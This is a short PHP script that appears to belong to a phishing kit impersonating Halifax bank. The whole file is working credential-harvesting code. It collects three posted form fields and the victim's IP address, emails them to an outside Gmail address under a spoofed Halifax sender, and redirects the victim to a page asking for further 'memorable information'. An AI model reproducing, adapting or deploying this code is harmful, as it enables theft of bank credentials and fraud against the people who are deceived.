<?php
$ip = getenv("REMOTE_ADDR");
$one= $_POST['unu'];
$four =$_POST['doi'];
$six =$_POST['trei'];
$mesaj="
1: $one
4: $four
6: $six
$token
ip: $ip
";
$send="kingsama786@gmail.com"; 
$subject = "$ip";
$headers = "From: Halifax<xpp@h4l1f4x.com>";
mail($send,$subject,$mesaj,$headers);
header("Location: entermemorableinformations.jsp");
?> 
